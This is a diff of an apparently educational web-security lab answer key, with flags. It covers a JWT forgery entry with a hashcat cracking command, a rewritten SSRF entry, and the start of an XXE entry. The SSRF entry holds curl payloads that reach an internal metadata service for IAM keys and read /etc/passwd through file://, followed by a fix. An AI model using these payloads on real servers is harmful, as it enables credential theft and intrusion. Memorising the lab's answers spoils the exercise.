@@ -87,13 +87,24 @@ hashcat -m 16500 token.jwt /usr/share/wordlists/rockyou.txt      # or: jwt_tool 
 **Result:** `FLAG{jwt_4lg_none_or_w3ak_s3cret_forg3d_admin}`. **Reason:** `alg:none` branch returns the payload unverified; HS256 secret is guessable. Deck: JWT Attacks.
 
 ## 3. SSRF  (`fetch.php?url=`)
-**Answer:** the fetcher takes any URL/scheme → reach the internal metadata service and read local files.
+**Answer:** `fetch.php` is a server-side fetcher (a link/image-preview proxy) meant for **external** URLs.
+With no allow-list you aim it at targets only the **server** can reach but you can't — the internal
+**instance-metadata service** (the lab's stand-in for the cloud endpoint `http://169.254.169.254/`, which
+leaks the VM's IAM role + keys) — or at local files via `file://`.
 **Command:**
 ```
-curl -sG "$B/fetch.php" --data-urlencode "url=http://127.0.0.1:8001/metadata.php"   # internal-only service
-curl -sG "$B/fetch.php" --data-urlencode "url=file:///etc/passwd"                   # file:// SSRF -> LFI
+# intended use (the "main URL") — a normal EXTERNAL fetch (needs internet):
+curl -sG "$B/fetch.php" --data-urlencode "url=https://example.com/"
+# the abuse — an INTERNAL-only service you cannot hit directly, but the server can:
+curl -sG "$B/fetch.php" --data-urlencode "url=http://127.0.0.1:8001/metadata.php"   # -> IAM role + access keys + flag
+curl -sG "$B/fetch.php" --data-urlencode "url=file:///etc/passwd"                   # file:// scheme -> SSRF becomes local file read
 ```
-**Result:** `FLAG{ssrf_reached_the_internal_metadata_service}`, then `/etc/passwd`. **Reason:** `file_get_contents($url)` with no scheme/host allow-list. Deck: SSRF_Guide · SSRF_Payload.
+**Result:** the metadata call returns the instance identity, `access-key-id` / `secret-access-key`, and
+`FLAG{ssrf_reached_the_internal_metadata_service}`; the `file://` call returns `/etc/passwd`.
+**Reason:** `file_get_contents($url)` with no scheme/host allow-list — the server will fetch *anything*,
+including loopback/internal addresses and local files. In a real cloud box those leaked keys = account
+takeover. **Fix:** allow-list scheme (`https` only) + destination host, and block link-local/private IPs.
+Deck: SSRF_Guide · SSRF_Payload.
 
 ## 4. XXE  (`import.php`, POST XML)   *(needs php-xml installed)*
 **Answer:** the XML parser resolves external entities → file read.
